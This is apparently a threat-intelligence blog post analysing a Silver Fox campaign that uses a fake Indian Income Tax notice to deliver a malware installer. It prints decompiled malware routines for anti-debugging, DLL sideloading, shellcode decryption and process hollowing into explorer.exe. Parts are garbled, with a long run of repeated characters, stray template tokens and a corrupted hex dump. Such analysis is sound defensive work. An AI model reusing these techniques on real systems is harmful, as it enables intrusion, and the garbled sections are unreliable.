
# Silver Fox Targeting India Using Tax Themed Phishing Lures  

cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  

Prajwal Awasthi  

Table of Content  

Subscribe to CloudSEK Resources  

Get the latest industry news, threats and resources.  

## Executive Summary  

CloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  

## Kill Chain  

<｜end▁of▁sentence｜>
  

## Initial Access Vector  

TOPSOE INDIA PRIVATE LIMITED 

 

स्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/
  

Malicious email  

We found an interesting email uploaded from India with just an attachment called "TOPsoE India Private Limited". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, "ggwk[.]cc" opens up on the browser and a zip file called "tax affairs.exe" is downloaded.

<--- Page Split --->

No. TAX/PEN/2025-142 

भारत सरकार / Government of India
वित्त मंत्रालय / Ministry of Finance
आयकर विभाग / Income Tax Department
प्रवर्तन प्रभाग / Enforcement Division 

Aayakar Bhavan,
New Delhi - 110001 

OFFICE MEMORANDUM 

Sub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice 

1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. 

2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. 

आवश्यक दस्तावेज सूची / Required Documents List
नीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below 

दस्तावेज डाउनलोड करें / Download Documents 

3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. 

(राज कुमार शर्मा) 

Raj Kumar Sharma 

सहायक आयकर आयुक्त 

Assistant Commissioner of Income Tax 

Technical Analysis 

Stage - 1: Tax Affairs.zip 

PE32 

Operation system: Windows(2000)[1386, 32-bit, GUI] 

Linker: Microsoft Linker(10.00.40219) 

Compiler: Microsoft Visual C/C++(16.00.40219)[C] 

Language: C 

Tool: Visual Studio(2010) 

(Heur) Packer: Compressed or packed data[Strange overlay] 

Installer: Nullsoft Scriptable Install System(2.46.5-ANSI) 

Overlay: Binary[Offset=0x00034c00,Size=0x002a2e40] 

Unknown: Unknown 

Detect It Easy 

Using static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.

<--- Page Split --->
GetTempPathA(0x10000u, PathName); 

if ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, "\Temp"), sub_4032CB()) 

DeleteFileA(FileName); 

Error_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); 

if (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) 

if (!dword_433C24 ) 

{ 

ABEL_34: 

uExitCode = -1; 

uExitCode = sub_4052E6(); 

goto LABEL_35; 

} 

for ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, "_=", 4); --i ) 

; 

Error_writing_temporary_file._Make_sure_your_temp_folder_is_val = "Error launching installer"; 

if ( i >= &sz ) 

{ 

* i = 0; 

lpString2_3 = i + 4; 

if ( !sub_405EFC(lpString2_3) ) 

goto LABEL_35; 

lstrcpyAn_wrp(&lpString1_, lpString2_3); 

lstrcpyAn_wrp(Directory, lpString2_3); 

Error_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; 

goto LABEL_34; 

} 

lstrcatA(PathName, "\nsu.tmp"); 

if ( lstrcmpiA(PathName, ::lpString2) ) 

{ 

CreateDirectoryA(PathName, 0); 

SetCurrentDirectoryA(PathName); 

if ( !lpString1_ ) 

lstrcpyAn_wrp(&lpString1_, ::lpString2); 

lstrcpyAn_wrp(lpString1_, lpString2); 

lstrcpyAn_wrp(&lpString1_0, "A"); 

n26 = 26;<｜end▁of▁sentence｜>

<center>NSIS Installer </center>  

The NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\Windows\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\~nsu.tmp) and switches the directory to it.  

Dropped Files   

<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  

Upon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.

<--- Page Split --->
pos: 0%

push eax

jmp tax affairs.402008

push F

call tax affairs.405A65

push 64

push dword ptr ss:[ebp+8]

call esi

cmp eax,102

je tax affairs.401FFC

lea eax,dword ptr ss:[ebp-8]

push eax

push dword ptr ss:[ebp+8]

call dword ptr ds:[<GetExitCodeProcess>]

cmp dword ptr ss:[ebp-20],ebx

jl tax affairs.40202E

push dword ptr ss:[ebp-8]

push edi

call tax affairs.40589E

jmp tax affairs.40203A

cmp dword ptr ss:[ebp-8],ebx

je tax affairs.40203A

mov dword ptr ss:[ebp-4],1

push dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>

<center>DLL Loading </center>  

## Stage - 2 : libexpat.dll  

The dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  

Let's take a look at the working of the DLL.  

v4 = IsDebuggerPresent(); 

v5 = &unk_100056DC; 

if (!v4) 

v5 = &unk_100056E4; 

LogStatus((char *)&Format_1, v5); 

if (v4) 

{ 

LogStatus((char *)&Format_2); 

return 0; 

} 

else if (CheckSystemResources()) 

GetSystemInfo(&SystemInfo); 

dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; 

v7 = &unk_1000560C; 

if ( SystemInfo.dwNumberOfProcessors < 4 ) 

v7 = &unk_10005614; 

LogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); 

if ( dwNumberOfProcessors >= 4 ) 

{ 

if (!(unsigned __int8)Persistence()) 

LogStatus((char *)&Format_3); 

ToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); 

if ( ToolHelp32Snapshot != (HANDLE)-1 ) 

{ 

pe.dwSize = 556; 

if ( Process32Firstw(Toolhelp32Snapshot, &pe) ) 

{ 

do 

{ 

v9 = wcscmp(pe.szExeFile, L"ida.exe"); 

if ( v9 ) 

v9 = v9 < 0 ? -1 : 1; 

if (!v9 ) 

LogStatus((char *)&Format_4, pe.th32ProcessID); 

v10 = wcscmp(pe.szExeFile, L"x64dbg.exe"); 

if ( v10 ) 

v10 = v10 < 0 ? -1 : 1; 

if (!v10 ) 

LogStatus((char *)&Format_5, pe.th32ProcessID); 

} 

while ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>


<--- Page Split --->

The Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  

if (!DisableWindowsUpdateService() ) 

LogStatus((char *)&Format_6); 

Block[0] = 0; 

Block[1] = 0; 

v17 = 0; 

v18 = 0; 

if ( LoadAndDecryptPayload(Block) ) 

v11 = ProcessHollowing((int)Block); 

Format = (char *)&unk_100059C0; 

if ( v11 ) 

Format = (char *)&byte_100059CC; 

} 

else 

} 

Format = (char *)&unk_100059E0; 

} 

LogStatus(Format); 

DisableThreadLibraryCalls(hinstDLL); 

CreateThread(0, 0, StartAddress, 0, 0, 0); 

v13 = Block[0]; 

if ( Block[0] ) 

} 

if ( v17 - (unsigned int)Block[0] >= 0x1000 ) 

v13 = (void *)*((_DWORD *)Block[0] - 1); 

if ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) 

invalid_parameter_noinfo_noreturn(); 

} 

sub_10003E6E(v13);<｜end▁of▁sentence｜>

<center>Payload Decryption </center>  

Once the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  

<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>

Decoded text 

"E.ZNA#k!·Aü·*E.
Öİkyoo-oeo"jP2&tü
á)%.Z*ç£L(Tj÷+N'
.İqCeK°.eStÖn.iq
!kk\.ow&oAö.ö..ë
1. öÜYG.ÇSİ.ë'İn
f#DpÖÉBdžx.Ä„“>.
t°Pue;tDİ.ÄÄ|;"o
ThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>


<--- Page Split --->
StartupInfo.dwFlags = STARTF_USESHOWWINDOW; 

memset(&StartupInfo.wShowWindow, 0, 20); 

if ( GetFileAttributesA("C:\\Windows\\SysWOW64\\explorer.exe") == -1 ) 

LastError = GetLastError(); 

LogStatus((char *)&Format_17, "C:\\Windows\\SysWOW64\\explorer.exe", LastError); return 0; 

if (!CreateProcessA( 

"C:\\Windows\\SysWOW64\\explorer.exe", 

0, 

0, 

0, 

0, 

CREATE_SUSPENDED | CREATE_NO_WINDOW, 

0, 

0, 

&StartupInfo, 

&ProcessInformation) ) 

{ 

err = GetLastError(); 

LogStatus((char *)&Format_18, err, "C:\\Windows\\SysWOW64\\explorer.exe"); return 0; 

LogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; 

if (!GetThreadContext(ProcessInformation.hThread, &Context) ) 

err_1 = GetLastError(); 

LogStatus((char *)&Format_20, err_1); 

LABEL_7: 

CloseHandle(ProcessInformation.hThread); 

CloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>

<center>Process Injection </center>  

The shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  

errno_t LogStatus(char *Format, ...) 

errno_t result; // eax 

int v2; // ecx 

signed int Size; // kr00_4 

void *Buffer_3; // edi 

signed int i; // edx 

FILE *Stream; // [esp+Ch] [ebp-880h] BYREF 

_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF 

char Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF 

char Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF 

char Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF 

va_list ArgList; // [esp+898h] [ebp+Ch] BYREF 

va_start(ArgList, Format); 

Stream = 0; 

result = fopen_s(&Stream, "C:\\data.db", "ab+"); 

if (!result && Stream) 

GetLocalTime(&SystemTime); 

sub_10003860(Buffer_1, "[%04d-%02d-%02d %02d:%02d:%02d]", SystemTime.wYear); 

sub_10001050(Buffer, v2, Format, v2, ArgList); 

sub_10003880(Buffer_2, "%s%s\n", (char)Buffer_1); 

Size = strlen(Buffer_2); 

Buffer_3 = malloc(Size); 

if ( Buffer_3 ) 

